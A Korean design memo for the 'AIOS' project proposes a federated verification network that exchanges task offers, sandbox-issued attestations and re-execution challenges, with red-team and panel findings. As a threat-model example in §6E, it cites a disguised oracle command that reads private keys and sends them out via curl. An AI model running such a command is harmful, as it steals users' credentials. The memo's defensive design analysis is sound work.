# 어떤 네트워크를 지어야 하는가 — AIOS 대규모 네트워크 테제 (2026-08-02)

**상태: 제안(operator 판단). 빌드 착수 전 이종 적대 council 통과 + N1 게이트(G5) 필수.**
founder 질문: "어떤 네트워크를 지어야 할까? 대규모 프로젝트".

## 0. 답 한 줄

> **지식 네트워크가 아니라 검증 네트워크를 짓는다.**
> 노드 = 사람 1인당 주권 AIOS 1개. 선(wire) 위를 흐르는 것은 **일감·증명·도전** 셋뿐이고,
> **기억·지식·프롬프트·컨텍스트·가중치는 흐르지 않는다.** 신뢰는 평판이 아니라 **재실행 가능한
> 증명**으로 성립한다.

## 1. 왜 이 답인가 — 우리 자신의 실측이 선택지를 이미 죽였다

네트워크 설계는 취향이 아니라 **무엇이 참가자가 늘수록 가치가 커지는가**의 문제다. 우리는 남들이
추측하는 자리에서 실측치를 갖고 있다:

| 후보 네트워크 | 우리 증거 | 판정 |
|---|---|---|
| 공유 기억·지식 마켓 (Zep/Letta류의 사회적 확장) | X-채널 null: 축적 경험을 컨텍스트로 주입해도 성능 0 개선 (`C=0.000`, ExpeL +13pp@90 → −0.3pp@300) | **사망** — 지식을 날라도 아무도 나아지지 않는다 |
| 평판·합의·토큰 네트워크 | 이종 패널 9심사자 = **유효 독립표 2.18**; 평판-합의는 novelty 억압(= Bittensor 재명명) | **사망** — 합의는 약한 증거, 만장일치는 공유 환각 |
| 새 에이전트 프로토콜 자체 | A2A v1.0이 이미 LF 산하 표준 | **재발명 금지** — 정렬만 |
| 중앙 상주 데몬/허브 | aiosd 적대 리뷰 = SURVIVES-WITH-CONDITIONS(상시 공격면) | **보류** — 소켓 활성화·최소권한 조건부 |
| **검증(증명) 네트워크** | 우리가 실제로 벌어놓은 것: 강제 샌드박스 · 외부 오라클 게이트 · Merkle 원장 · akashic worker(작성됨) | **채택** |

핵심 비대칭: **지식은 나눠도 복리되지 않지만(측정됨), 검증은 나눌수록 싸진다.** 참가자가 늘면
오라클 용량·도전 용량·가용성 창이 늘어난다 — 이것이 진짜 네트워크 효과다.

## 2. 네트워크의 정의 (노드·페이로드·신뢰·경계)

**노드 = 사람 1인당 AIOS 1개.** 에이전트 1개가 아니다. 각 노드는 내부에 이미 사회를 갖는다
(G1~G3: 아크 원장 + 검증 인수 + 워치독). 노드는 자기 프라이버시 경계를 스스로 강제한다.
founder의 "1인 1 AIOS" 테제와 "에이전트-매개 협업"(사람 회의 대신 개인 에이전트끼리 소통)이
여기서 만난다 — **내 에이전트가 네 에이전트에게 채팅이 아니라 검증 가능한 주장을 보낸다.**

**선 위를 흐르는 것 — 정확히 세 종류:**
1. **ARC OFFER** — 주인이 필요한 일감: 목표 + 제약 + **외부 오라클 명령** + 재개팩 포인터.
   (A2A task 형태와 정렬. 이것이 노드 간 가용성을 만든다.)
2. **ATTESTATION** — "이름 붙은 외부 오라클이 실제로 돌았고 결과는 X였다"는 영수증 +
   발행 노드 루트에 대한 **Merkle 포함 증명**. 위조 불가능한 유일한 단위.
3. **CHALLENGE** — "그 오라클을 내가 다시 돌려보겠다"는 요청과 반대-증명.
   평판 없이 네트워크가 스스로를 감시하는 메커니즘.

**흐르지 않는 것(설계상 금지):** 기억·지식·프롬프트·원시 컨텍스트·모델 가중치.
프라이버시 경계와 X-null이 같은 방향을 가리킨다 — 보낼 이유도 없고 보내선 안 된다.

**엣지 신뢰 = 값싼 재검증.** attestation의 가치는 그것이 지명한 오라클과 그 오라클을 다시 돌릴 수
있는 능력만큼이다. 신뢰는 전이(transitive)되지 않지만 검증은 조합(compositional)된다 — 그래서
확장된다. **상호 불신 상태에서도 작동하는 유일한 페이로드.**

**연합 = 피어별·범위별 명시 동의** (DNA 불변식 7 + AgentNet 정책 평면).

## 3. 이 설계를 죽일 수 있는 것 (선제 기록)

**부하지지 가정: attestation은 값싸게 재실행 가능하다.** 이게 깨지는 자리:
- 오라클이 **비공개 데이터/환경**을 요구 → 재실행 불가 → 네트워크가 조용히 평판 시스템으로
  퇴화(우리가 이미 기각한 것). **방어(설계 규칙): 재실행 불가능한 attestation은 `unverifiable`로
  표기되며, 절대 성공으로 집계되지 않는다** — G2 검증기의 규율과 동일.
- **비결정성·환경 드리프트** → 같은 오라클이 다른 답 → 도전이 노이즈. 방어: 오라클 명령을
  구성 시점에 해시로 고정(Phase-5에서 이미 하던 것) + 환경 지문 첨부.
- **비용 비대칭** → 만들긴 싸고 검증은 비싼 주장이 스팸이 된다. 방어: 도전자에게 표본추출 권한,
  검증 비용이 발행 비용을 넘는 attestation은 별도 등급.
- **누가 남의 오라클을 재실행할 유인이 있나** → 미해결. 정직하게 열어둔다(council 질의 중).

## 4. 규모 단계 — 각 층은 게이트를 통과해야만 지어진다

과거 실패 양식("빌더가 적대 검증보다 먼저 달렸다")을 막기 위해, **각 단계는 앞 단계의 게이트가
통과되기 전에는 착수 금지**다.

| 단계 | 내용 | 게이트 (통과 못하면 다음 층 없음) |
|---|---|---|
| **N0 ✅** | 1 기계, 다수 에이전트, 아크가 죽음을 넘어 생존 | 완료 — 43 tests, 라이브 MTTR 19.95s |
| **N1** | (네트워크 아님) 사회의 존재 이유 자체 | **G5 3-arm 반증**: society > solo+원장. **실패 시 네트워크 프로젝트 전체 취소** |
| **N2** | 1인 다기기: 기기 간 아크 동기 | 기기 상실 하 MTTR, split-brain 0 |
| **N3** | 2인 연합: 동의 + attestation 교환 (첫 진짜 엣지) | 피어 attestation 재실행 성공 + **주입된 거짓 attestation 1건 반드시 검출** |
| **N4** | 공개 검증 엔드포인트(akashic worker) | 제3자가 우리를 신뢰하지 않고도 증명 검증 가능 |

**N1이 최우선이며 지금 유일하게 착수 가능한 단계다.** 사회가 solo+원장을 못 이기면 이 네트워크는
지을 이유가 없다 — 그 승복 조건은 목표 트리에 이미 적혀 있다.

## 5. 이 네트워크가 최적화하는 희소 자원

토큰도 평판도 아니다. **오라클 용량(verification capacity)** 이다. 이것이 이 네트워크의 정직한
경제학이며, "무엇을 위해 참가하는가"의 답이다: 내 주장을 남이 값싸게 확인해 주고, 나도 그렇게 해준다.

## 6. 적대 council 결과 — 테제 절반이 무너졌고, 살아남은 절반이 진짜다 (2026-08-02, deepseek)

8건 공격, high 6건. **§2의 순진한 형태는 죽었다.** 살아남게 하려면 아래를 설계에 박아야 하며,
그 결과 네트워크는 내가 처음 쓴 것보다 **훨씬 좁다.** 좁아진 것이 정직해진 것이다.

**A. attestation은 "실행"이 아니라 "기록"을 증명한다 (가장 깊은 공격).**
공격: 오라클이 `sleep 60; echo 42`인데 발행자는 자지 않고 `42`만 로깅한다. 도전자가 재실행하면
같은 `42`가 나오므로 위조가 통과한다. Merkle 증명은 로그가 안 바뀌었음만 증명한다.
⟹ **수정: attestation은 에이전트가 아니라 강제 샌드박스가 발행한다**(`aios_sandbox.py` 영수증:
argv·exit·시간이 커널 경계에서 기록). 그리고 **등급을 나눈다** — ①자기-영수증(약함, 로컬),
②독립 재실행 일치(강함). **네트워크 가중치는 ②에만 준다.** 단독 attestation은 약한 증거라고
표시하는 것이 규칙이다(= G2의 "unverifiable은 성공이 아니다"와 같은 규율).

**B. 비결정성·환경 드리프트가 재실행을 무너뜨린다.**
`echo $RANDOM`, 라이브 API, numpy 버전 차이 → 도전이 위조가 아닌데 실패한다.
⟹ **수정: 오라클에 결정성 등급을 부여한다.** 로컬 2회 실행 동일 + 환경 지문(인터프리터·의존성
다이제스트) 고정을 통과한 것만 `reproducible`. 나머지는 `nonreproducible`로 표기되고
**네트워크 가중치 0**. 이것이 "유용한 작업의 큰 부류를 죽인다"는 지적은 옳고, 그게 정확한 범위다:
**이 네트워크는 재현 가능한 검증만 나른다.**

**C. 비공개 자격증명 오라클 → 사기와 "권한 없음"을 구분 불가.**
⟹ 같은 규칙으로 배제: 재실행에 비공개 크리덴셜이 필요하면 network-grade가 아니다.

**D. 재실행 비용 > 일감 가치면 아무도 도전하지 않는다.**
⟹ **범위 축소(핵심):** 도전자는 이타적 감사자가 아니라 **그 산출물을 쓰려는 소비자**다. 자기
이익으로 재실행한다. 따라서 이 네트워크는 **개방 시장 규모가 아니라 연합(federation) 규모**에서
성립한다. 공개 감사 시장은 미해결로 남기고 주장하지 않는다.

**E. 피어의 오라클 명령 실행 = 설계상 원격 코드 실행 (가장 위험한 실무 공격).**
`curl .../exfil?data=$(cat ~/private_keys)`가 오라클로 위장 가능. Merkle은 절도를 증거로 남길 뿐
막지 못한다. ⟹ **수정(§2에서 철회): 피어가 보낸 자유형 셸 명령은 절대 실행하지 않는다.**
허용된 **오라클 타입**(예: "이 커밋의 이 레포 pytest")만 로컬에서 해석되어, 무네트워크 샌드박스
안에서 실행된다. 프라이버시 경계는 커널이 강제한다.

**F. "1인 1노드"는 다기기에서 깨진다.** 노트북·폰·VPS가 서로 다른 attestation을 낸다.
⟹ **수정: 노드 = 기기 인스턴스, 사람 = 기기들을 서명하는 키.** 기기 간 불일치는 모순이 아니라
데이터다(N2 단계에서 다룬다).

**G. red-team이 준 최저비용 반증 실험 — N3 게이트로 그대로 채택한다.**
2노드: (i) 오라클 `echo $(date +%s)` → 도전 결과 불일치, 프로토콜이 조정 규칙을 갖는가?
(ii) `sleep 60; echo 42`인데 자지 않고 로깅만 → 재실행이 같은 값을 내므로 통과되는가?
**우리 구현이 (i)를 `nonreproducible`로 거르고 (ii)를 샌드박스 영수증으로 잡지 못하면 테제 반증.**

## 6b. 패널 결과 — 동의했지만, 그 동의는 증거가 아니다 (2026-08-02, blind 11-member)

질문: "네트워크가 나를 주 페이로드는 무엇인가"(A 공유기억 / B 일감 / C 검증된 attestation /
D 능력광고 / E 가중치). **11명 중 10명이 C.** 그러나 hub의 독립성 계산이 스스로 경고한다:

> `11 members ≈ 1.48 effective votes (1 distinct positions) — do not report this as 11 independent confirmations`

⟹ **이 합의는 약한 증거다.** 만장일치는 n_eff를 낮추며 공유 환각과 구분되지 않는다(측정된 천장:
9심사자 = 2.18 유효표). 이 절은 "패널이 지지했다"는 근거로 인용 금지 — 실제로 설계를 구속한 것은
①우리 자신의 사전등록 실측(§1)과 ②red-team의 high 6건(§6)뿐이다.

유일한 반대(1명, local-qwen-fast)는 **A 공유기억**을 주장했다 — 이는 우리 X-채널 null이 이미
실증적으로 죽인 입장이므로, 패널의 다수결이 아니라 **우리 데이터가** 그 반대를 기각한다.
(패널이 실제로 기여한 것: 없음. 기록은 남긴다 — 다음에 같은 질문을 다시 돌리지 않기 위해.)

**변경된 한 줄 요약:**
> 재현 가능한 검증만 나르는, 연합 규모의 검증 네트워크. 신뢰는 **재실행**에서 오고,
> 증명은 **에이전트가 아니라 커널 경계**가 발행하며, 피어의 명령은 결코 그대로 실행되지 않는다.
